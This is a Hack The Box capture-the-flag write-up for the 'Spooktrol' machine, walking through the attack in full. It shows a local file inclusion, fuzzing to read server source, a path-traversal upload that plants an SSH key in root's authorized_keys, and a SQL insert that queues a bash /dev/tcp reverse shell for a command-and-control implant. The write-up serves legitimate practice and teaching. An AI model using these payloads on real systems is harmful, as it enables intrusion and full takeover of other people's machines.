---
layout: post
title: HTB Spooktrol Writeup  
subtitle: Hard Box
thumbnail-img: /assets/img/spooktrol.png
tags: [HTB]
---

# Notes
![Spooktrol](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/spooktrol.png)


| Name | Spooktrol |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 26 Oct 2021 |
| DIFFICULTY | Hard |

# Nmap Scan
IP:10.10.11.123
```
nmap -p- -sC -sV -oN nmap/scriptScan 10.10.11.123  

PORT     STATE SERVICE VERSION                                                                 
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)            
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)           
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)         
80/tcp   open  http    uvicorn                                                                 
| fingerprint-strings:                                                                         
|   FourOhFourRequest:                                                                         
|     HTTP/1.1 404 Not Found                                                                   
|     date: Mon, 08 Nov 2021 18:55:44 GMT                                                      
|     server: uvicorn
|     content-length: 22                                                                       
|     content-type: application/json
|     Connection: close                                                                        
|     {"detail":"Not Found"}                                                                   
|   GetRequest: 
|     HTTP/1.1 200 OK            
|     date: Mon, 08 Nov 2021 18:55:32 GMT
|     server: uvicorn
|     content-length: 43
|     content-type: application/json
|     Connection: close
|     {"auth":"111fb8232117db42814921d3a03b0e7e"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Mon, 08 Nov 2021 18:55:38 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
| http-robots.txt: 1 disallowed entry 
|_/file_management/?file=implant
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 16:77:76:8a:65:a3:db:23:11:21:66:6e:e4:c3:f2:32 (RSA)
|   256 61:92:eb:7a:a9:14:d7:60:51:00:0c:44:21:a2:61:08 (ECDSA)
|_  256 75:c1:96:9c:69:aa:c8:74:ef:4f:72:bd:62:53:e9:4c (ED25519)
```

# SSH 22, 2222
It looks like there are two ssh ports listening with unique keys. There is most likely a docker container running. 

The attack surface here is minimal so I'll move onto port 80

# HTTP 80
Going to the page we can see some JSON and a unique auth token

![Spooktrol](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/spooktrol/spooktrol_landing.png)

From our `nmap` scan we see that there is 1 disallowed entry `/file_management/?file=implant`. Going there we see a bunch of junk on the screen 

![Spooktrol](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/spooktrol/spooktrol_junk.png)

Lets try seeing if it is vulnerable to LFI `http://10.10.11.123/file_management/?file=../../../../../../../etc/passwd`

![Spooktrol](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/spooktrol/spooktrol_passwd.png)

Looking in the `/etc/passwd` file there are not really any users home directories that we can enumerate. I'll move back to the weird file `implant` and pick it apart a little. 


# Implant
I'll use wget to download the file
```
┌──(root💀kali)-[~/htb/spooktrol]
└─# wget '10.10.11.123/file_management/?file=implant'                                 
```

Running `file` against it we can see that it is an executable 
```
┌──(root💀kali)-[~/htb/spooktrol]
└─# file implant| more                                                                                                       
implant: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=ce05777839d03f0df9cfcc82f20c437dd55e645e, with debug_info, not stripped
```

After running it we see it errors out
```
┌──(root💀kali)-[~/htb/spooktrol]                                                                                                                                                             
└─# ./implant                                                                                                                                                                                 
terminate called after throwing an instance of 'nlohmann::detail::parse_error'                                                                                                                
  what():  [json.exception.parse_error.101] parse error at line 1, column 1: syntax error while parsing value - unexpected end of input; expected '[', '{', or a literal                      
zsh: abort      ./implant 
```

I used `strace` to look at how `implant` is behaving when it runs
`strace ./implant`

I found that it is trying to make some connections. The first one is a UDP connection and the second is a TCP. If I had to guess the UDP is some sort of DNS request 
```
socket(AF_INET6, SOCK_DGRAM, IPPROTO_IP) = 3                                                                                                                                                  
close(3)                                = 0                                                                                                                                                   
socketpair(AF_UNIX, SOCK_STREAM, 0, [3, 4]) = 0   
```
 
 Next, I opened up wireshark and captured the packets. I saw that it was sending the request on `eth0` rather than `tun0`. We can see that it is making a DNS request to spooktrol.htb

![Spooktrol](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/spooktrol/spooktrol_dns.png)
 
 Lets add it to our `/etc/hosts` file
 `10.10.11.123    spooktrol.htb`
 
 After running it again it kept aborting out so I decided to run it in a docker container 
 
 ```
 docker run --rm -it --entrypoint=/bin/bash -v `pwd`:/$/root/htb/spooktrol -w /root/htb/spooktrol "$@" ubuntu:18.04
 
 apt-get update
 apt-get install vim
 
 vim /etc/hosts
 ```
 
 It started to work after that 
 ```
 root@a7c426f68fef:/$/root/htb/spooktrol# ./implant
{"status":0,"arg1":"whoami","id":2,"result":"","target":"16f6a25a0719724a816d02291602b084","task":1,"arg2":""}
null{"task":0}
No tasks...
 ```
 
 Lets now see what is going on in wireshark red is implant blue is server

![Spooktrol](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/spooktrol/spooktrol_wireshark.png)
 
 Analyzing it we can see that we are sending a request of our hostname to the server (my docker container  /?hostname=a7c426f68fef), then the server is printing out some args and we are posting them to the server. So this is probably some kind of C2
 
 # LFI Fuzzing
 
 I decided to next move on and try and fuzz out the file structure using `ffuf` I know that its a python web server (uvicorn from wireshark) so I can fuzz for .py files I started with one directory above and found `server.py` and inside revealed `app.main`
 `ffuf -u http://10.10.11.123/file_management/?file=../FUZZ.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c -t 200`
 
 server.py
 ```
 import uvicorn                               
                                                                                               
if __name__ == "__main__":  
    uvicorn.run("app.main:app", host="0.0.0.0", port=8000, reload=True)

 ```
 
 This lead me to fuzz `../app/FUZZ.py` and gave me  lots of files
 ```
 ffuf -u http://10.10.11.123/file_management/?file=../app/FUZZ.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c -t 200
 
 
main                    [Status: 200, Size: 2938, Words: 546, Lines: 89]
database                [Status: 200, Size: 406, Words: 46, Lines: 13]
models                  [Status: 200, Size: 1014, Words: 161, Lines: 41]
 ```
 
 I went ahead and downloaded `main.py` we can see that there is `/file_upload/` lets try and upload a file. I created a file called "test.txt" that I used to test this with. We used PUT as our method and a randomly generated cookie from the main page.
```
┌──(root💀kali)-[~/htb/spooktrol]
└─# curl -X PUT -F file=@test.txt http://10.10.11.123/file_upload/ -H 'Cookie: auth=1d9359ba30b2a9d8d39f2998d7ae5858'
{"message":"File upload successful /file_management/?file=test.txt"}  
```

We can now upload files! Lets upload our ssh `id_rsa.pub`
`cat ~/.ssh/id_rsa.pub > authorized_keys`

Create the request and send it to burp 
```
┌──(root💀kali)-[~/htb/spooktrol]
└─# curl -X PUT -F file=@authorized_keys http://10.10.11.123/file_upload/ -H 'Cookie: auth=1d9359ba30b2a9d8d39f2998d7ae5858' --proxy http://127.0.0.1:8080 
```

Change the `filename=` to  ../../../../../root/.ssh/authorized_keys. This will put our ssh key into the roots folder of authorized_keys
```
PUT /file_upload/ HTTP/1.1
Host: 10.10.11.123
User-Agent: curl/7.74.0
Accept: */*
Cookie: auth=1d9359ba30b2a9d8d39f2998d7ae5858
Content-Length: 770
Content-Type: multipart/form-data; boundary=------------------------a26f86f211353f47
Connection: close

--------------------------a26f86f211353f47
Content-Disposition: form-data; name="file"; filename="../../../../../root/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgLkSJjtpRAEOKT6SKcdsv37MX/ib4dWJ79lelyHcpvwjqXIe7XXIjzs1zQs0DDiDINA/Bg339LdWHON2MmsJcCSTRBVgf71Er+kwEE4/zdaW9HGK1HTZ22qupQzQ+rjDrihJ0jqnZ87sVUFQ4Z1+7ztl84rdwznJww+ZIy08G2xXFw2rwMPZD2fKdXwbYFUu5XqEvU4ClH+Iuo+bij9acJtl/qq3ora9goZcFDn2bbJ08Kj5OnvhVGR3y6Prc95qxTBQZz/SDakqmrCidvHBAnIizSwyDvXWLkivcF7LJ9fHJmD3MB2LPzvuxL9I/sYd9TneFtxEH9Lc4V32D43CnjGtCjSmqyc1Bhyh6SZ+EsjyHR65De8aX5sVjrMGkOI+LYi8wZ2Ik3ksT7CQxDnjhHGdncxbPbNwHx0VC/vyTkJ9HFnmCrhsPH+yX2t361iFks2RrQALPNNP6ZkWNX8xy1YD7J624WTK3LbRYYG0wr4Uh7igR+l2nDSFYMhN3jWc= root@kali
--------------------------a26f86f211353f47--
```

Now we can login as root on port 2222 the docker container
```
ssh -p 2222 root@10.10.11.123  

root@spook2:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# Root
Looking around the file structure I found `/opt/spook2` with a database called `sql_app.db` I opened up the database with sqlite
`root@spook2:/opt/spook2# sqlite3 sql_app.db`

Running `.tables` I can see a few tables, looking at sessions I can see that there is one for "spooktrol", probably the host machine
```
sqlite> select * from sessions;
1|10a6dd5dde6094059db4d23d7710ae12|spooktrol
2|16f6a25a0719724a816d02291602b084|a7c426f68fef
```

Another table was `tasks`, I can see that it is running commands on the machine with the respective session. 
```
sqlite> select * from tasks;
1|10a6dd5dde6094059db4d23d7710ae12|1|1|whoami||root

2|16f6a25a0719724a816d02291602b084|1|1|whoami||root

3|1201af6617735b8e28257b603061762e|1|1|whoami||root

4|15850f46d80fe8586a866b75cb79cdb6|1|1|whoami||root

```

I might be able to replace `whoami` with a reverse shell, so I'll insert a new row
```
INSERT INTO tasks VALUES(12,'10a6dd5dde6094059db4d23d7710ae12',0,1,'bash -c "bash -i >& /dev/tcp/KALI IP/9001 0>&1"','',X'726f6f740a');
```

Then set up a listener and wait for the shell!
```
┌──(root💀kali)-[~/htb/spooktrol]
└─# nc -lvnp 9001                                              
listening on [any] 9001 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.123] 58232
bash: cannot set terminal process group (15776): Inappropriate ioctl for device
bash: no job control in this shell
root@spooktrol:~# id
id
uid=0(root) gid=0(root) groups=0(root)

```
